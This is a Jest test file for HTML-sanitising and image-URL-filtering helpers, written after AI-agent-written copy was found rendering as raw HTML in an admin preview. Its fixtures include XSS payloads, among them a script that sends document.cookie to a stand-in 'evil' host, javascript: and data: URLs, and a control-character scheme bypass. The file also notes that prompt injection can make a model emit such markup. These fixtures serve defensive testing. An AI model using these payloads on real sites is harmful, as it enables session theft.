/**
 * `ContentRenderBody` used to hand `structured.sections[].html` and `body_html`
 * to `dangerouslySetInnerHTML`, and both are written by the COPY agent. It
 * renders in the ADMIN PREVIEW MODAL as well as on the public page, so the
 * payload would have executed in the reviewer's authenticated session.
 *
 * These are the shapes a model — or an injected instruction inside one — would
 * actually produce.
 */

import { htmlToPlainText, containsMarkup, safeImageUrl } from '@/lib/content/contentSafety'

const U = (cp: number) => String.fromCodePoint(cp)

describe('containsMarkup', () => {
  it.each([
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<p>hi</p>',
    '<!-- comment -->',
    '</div>',
  ])('flags %j', s => expect(containsMarkup(s)).toBe(true))

  it.each(['plain text', 'a < b and c > d', '5 < 10', '', null, undefined])(
    'does not flag %j',
    s => expect(containsMarkup(s as string)).toBe(false),
  )
})

describe('htmlToPlainText removes the payload, keeps the prose', () => {
  it('strips a script tag and its BODY, not just the tags', () => {
    const out = htmlToPlainText('<p>Welcome</p><script>fetch("//evil/"+document.cookie)</script>')
    expect(out).toContain('Welcome')
    expect(out).not.toMatch(/fetch|evil|document\.cookie/)
    expect(out).not.toContain('<')
  })

  it('an UNTERMINATED script still loses its body', () => {
    const out = htmlToPlainText('<p>Welcome</p><script>steal()')
    expect(out).toContain('Welcome')
    expect(out).not.toContain('steal')
  })

  it('drops an event-handler attribute along with its tag', () => {
    const out = htmlToPlainText('<img src=x onerror="alert(1)">Southampton')
    expect(out).toBe('Southampton')
  })

  it('keeps paragraph structure as line breaks', () => {
    expect(htmlToPlainText('<p>One</p><p>Two</p>')).toBe('One\nTwo')
    expect(htmlToPlainText('a<br>b')).toBe('a\nb')
  })

  it('decodes entities, then re-strips what decoding revealed', () => {
    // A single-encoded tag must not survive the decode pass as live markup.
    expect(htmlToPlainText('&lt;script&gt;alert(1)&lt;/script&gt;')).toBe('alert(1)')
    expect(htmlToPlainText('Allie &amp; Adam')).toBe('Allie & Adam')
    expect(htmlToPlainText('caf&#233;')).toBe('café')
    expect(htmlToPlainText('caf&#xe9;')).toBe('café')
  })

  it('leaves an unknown or out-of-range entity as written rather than guessing', () => {
    expect(htmlToPlainText('&nosuchentity;')).toBe('&nosuchentity;')
    expect(htmlToPlainText('&#1114112;')).toBe('&#1114112;')
    // A lone surrogate is not a character; do not invent one (rule 15).
    expect(htmlToPlainText('&#xD800;')).toBe('&#xD800;')
  })

  it('collapses a non-breaking space so a padded line is not "content"', () => {
    expect(htmlToPlainText(`a${U(0xa0)}${U(0xa0)}b`)).toBe('a b')
  })

  it.each([null, undefined, ''])('handles %j', v => expect(htmlToPlainText(v as string)).toBe(''))
})

describe('safeImageUrl', () => {
  it.each(['/images/party.jpg', 'https://cdn.example.com/a.png', 'http://example.com/a.png'])(
    'allows %j',
    u => expect(safeImageUrl(u)).toBe(u),
  )

  it.each([
    'javascript:alert(1)',
    'data:text/html;base64,PHNjcmlwdD4=',
    '//evil.example.com/a.png',
    'vbscript:x',
    'file:///etc/passwd',
    'images/relative.png',
    '',
    '   ',
  ])('refuses %j', u => expect(safeImageUrl(u)).toBeNull())

  it('refuses a scheme split by a control character', () => {
    // `java<NUL>script:` is the classic bypass; built by code point so the test
    // file stays readable (plan §24 — an invisible literal is an unreadable
    // guardrail).
    expect(safeImageUrl(`java${U(0x00)}script:alert(1)`)).toBeNull()
    expect(safeImageUrl(`java${U(0x09)}script:alert(1)`)).toBeNull()
    expect(safeImageUrl(`java${U(0x0a)}script:alert(1)`)).toBeNull()
  })

  it('refuses U+2028 / U+2029 INSIDE the URL — the pair that already cost a guardrail', () => {
    expect(safeImageUrl(`/a${U(0x2028)}b.png`)).toBeNull()
    expect(safeImageUrl(`/a${U(0x2029)}b.png`)).toBeNull()
    expect(safeImageUrl(`https://cdn.example.com/${U(0x2028)}x.png`)).toBeNull()
  })

  it('a TRAILING U+2028 is removed by trim(), not by the screen', () => {
    // Worth pinning: `String.prototype.trim` counts U+2028/U+2029 as
    // whitespace, so a trailing one never reaches the code-point loop. The URL
    // that comes back is the trimmed one — safe, but for a different reason
    // than the test above, and a future refactor that drops the trim would
    // change which check is load-bearing.
    expect(safeImageUrl(`/a.png${U(0x2028)}`)).toBe('/a.png')
  })

  it.each([null, undefined])('handles %j', v => expect(safeImageUrl(v as string)).toBeNull())
})
